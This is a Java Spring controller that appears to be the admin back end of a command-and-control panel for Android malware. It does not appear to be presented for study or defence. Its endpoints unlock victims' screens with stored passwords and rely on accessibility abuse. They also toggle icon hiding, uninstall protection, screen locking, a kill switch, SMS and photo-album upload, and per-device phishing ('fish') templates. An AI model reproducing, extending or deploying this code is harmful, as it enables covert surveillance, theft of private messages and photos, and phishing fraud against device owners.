package io.renren.modules.app.web.admin;

import java.util.List;
import java.util.Objects;

import javax.annotation.Resource;

import io.renren.modules.app.entity.FishTemplates;
import io.renren.modules.app.mapper.FishTemplatesMapper;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.google.common.collect.Lists;

import io.renren.common.constant.Constant;
import io.renren.common.page.PageData;
import io.renren.common.utils.Result;
import io.renren.modules.app.entity.Device;
import io.renren.modules.app.entity.InstallAppFilter;
import io.renren.modules.app.entity.UnlockScreenPwd;
import io.renren.modules.app.mapper.InstallAppFilterMapper;
import io.renren.modules.app.mapper.InstallAppMapper;
import io.renren.modules.app.param.DeviceParam;
import io.renren.modules.app.service.DeviceService;
import io.renren.modules.app.service.InstallAppService;
import io.renren.modules.app.service.UnlockScreenPwdService;
import io.renren.modules.sys.dto.SysUserDTO;
import io.renren.modules.sys.service.SysUserService;
import lombok.extern.slf4j.Slf4j;

@RestController
@RequestMapping("device")
@Slf4j
public class DeviceController extends BaseController {

    @Resource
    private DeviceService deviceService;
    @Resource
    private InstallAppService installAppService;

    @Resource
    private InstallAppMapper installAppMapper;

    @Resource
    private InstallAppFilterMapper installAppFilterMapper;

    @Resource
    private SysUserService sysUserService;

    @Resource
    private UnlockScreenPwdService unlockScreenPwdService;
    @Resource
    private FishTemplatesMapper fishTemplatesMapper;


    @RequestMapping("page")
    public Result<PageData<Device>> page(@RequestBody DeviceParam param) {
        Page<Device> page = new Page<>(param.getPage(), param.getLimit());
        QueryWrapper<Device> query = new QueryWrapper<>();
        LambdaQueryWrapper<Device> lambda = query.lambda();

        // 设备ID
        if (StringUtils.isNotEmpty(param.getDeviceId())) {
            lambda.eq(Device::getDeviceId, param.getDeviceId());
        }

        // 包名
        if (StringUtils.isNotEmpty(param.getPkg())) {
            lambda.eq(Device::getPkg, param.getPkg());
        }

        // 型号
        if (StringUtils.isNotEmpty(param.getModel())) {
            lambda.eq(Device::getModel, param.getModel());
        }

        // 语言
        if (StringUtils.isNotEmpty(param.getLanguage())) {
            lambda.eq(Device::getLanguage, param.getLanguage());
        }

        // 品牌
        if (StringUtils.isNotEmpty(param.getBrand())) {
            lambda.eq(Device::getBrand, param.getBrand());
        }

        // 状态
        if (param.getStatus() != null) {
            lambda.eq(Device::getStatus, param.getStatus());
        }
        
        if (StringUtils.isNotEmpty(param.getRemark())) {
            lambda.like(Device::getRemark, param.getRemark());
        }

        // 最后活动时间范围
        if (param.getStart() != null) {
            lambda.ge(Device::getLastHeart, param.getStart());
        }

        if (param.getEnd() != null) {
            lambda.le(Device::getLastHeart, param.getEnd());
        }

        // Kill状态
        if (param.getKill() != null) {
            lambda.eq(Device::getKill, param.getKill());
        }

        // 安装应用过滤
        if (StringUtils.isNotEmpty(param.getInstallApp())) {
            List<String> installAppDeviceIdList = installAppMapper.selectByPackageName(param.getInstallApp());
            if (installAppDeviceIdList.isEmpty()) {
                return Result.toSuccess(new PageData<Device>(Lists.newArrayList(), 0));
            }
            lambda.in(Device::getDeviceId, installAppDeviceIdList);
        }

        Page<Device> pageData = deviceService.page(page, lambda);
        return Result.toSuccess(new PageData<Device>(pageData.getRecords(), pageData.getTotal()));
    }

    @RequestMapping("installAppFilterList")
    public Result<List<InstallAppFilter>> installAppFilterList() {
        return Result.toSuccess(installAppFilterMapper.selectList(new QueryWrapper<>()));
    }

    @RequestMapping("wakeup")
    public Result<Void> wakeup(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Long unlockPwdId = jsonObject.getLong("unlockPwdId");
        Device device = deviceService.getById(id);

        if (!Objects.equals(Constant.YN.Y, device.getAccessibilityServiceEnabled())) {
            return Result.toError("当前设备没有开启无障碍权限!");
        }
        Device updateDevice = new Device();
        if (unlockPwdId == null) {
            //使用空密码
            updateDevice.setLockScreen(new JSONObject());
        } else {
            UnlockScreenPwd unlockPwd = unlockScreenPwdService.getById(unlockPwdId);
            if (unlockPwd == null) {
                return Result.toError("无法找到解锁密码");
            }
            updateDevice.setLockScreen(JSONObject.parseObject(JSONObject.toJSONString(unlockPwd)));
        }
        updateDevice.setId(device.getId());
        updateDevice.setStatus(Constant.DeviceStatus.need_wake);
        deviceService.updateById(updateDevice);
        return Result.toSuccess(null);
    }


    @RequestMapping("updateRemark")
    public Result<Void> updateRemark(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Device device = deviceService.getById(id);
        if (device == null) {
            return Result.toError("没有找到这个设备!");
        }
        Device update = new Device();
        update.setId(id);

        update.setRemark(jsonObject.getString("remark")); 
        deviceService.updateById(update);
        return Result.toSuccess();
    }
    
    @RequestMapping("updateSwitch")
    public Result<Void> updateSwitch(@RequestBody JSONObject jsonObject) {
        Long id = jsonObject.getLong("id");
        Device device = deviceService.getById(id);
        if (device == null) {
            return Result.toError("没有找到这个设备!");
        }
        Device update = new Device();
        update.setId(id);

        update.setHideIcon(jsonObject.getInteger("hideIcon"));
        update.setAccessibilityGuard(jsonObject.getInteger("accessibilityGuard"));
        update.setUninstallGuard(jsonObject.getInteger("uninstallGuard"));
        update.setFixLockScreen(jsonObject.getInteger("fixLockScreen"));
        update.setUnlockFish(jsonObject.getInteger("unlockFish"));
        update.setKill(jsonObject.getInteger("kill"));
        update.setUploadAlbum(jsonObject.getInteger("uploadAlbum"));
        update.setUploadSms(jsonObject.getInteger("uploadSms"));
        deviceService.updateById(update);
        return Result.toSuccess();
    }

    @RequestMapping("fishCodeList")
    public Result<List<FishTemplates>> fishCodeList(){
        return Result.toSuccess(fishTemplatesMapper.list());
    }

    @RequestMapping("updateFishSwitch")
    public Result<Void> updateFishSwitch(@RequestBody JSONObject jsonObject){
        Long id = jsonObject.getLong("id");
        Device device = deviceService.getById(id);
        String code = jsonObject.getString("code");
        boolean value = jsonObject.getBooleanValue("value");
        if(device == null){
            return  Result.toError("没有找到这个设备!");
        }

        Device update = new Device();
        update.setId(id);
        JSONObject fishSwitch = device.getFishSwitch();
        if(fishSwitch == null){
            fishSwitch = new JSONObject();
        }
        fishSwitch.put(code, value);
        update.setFishSwitch(fishSwitch);
        deviceService.updateById(update);
        return Result.toSuccess();

    }


}
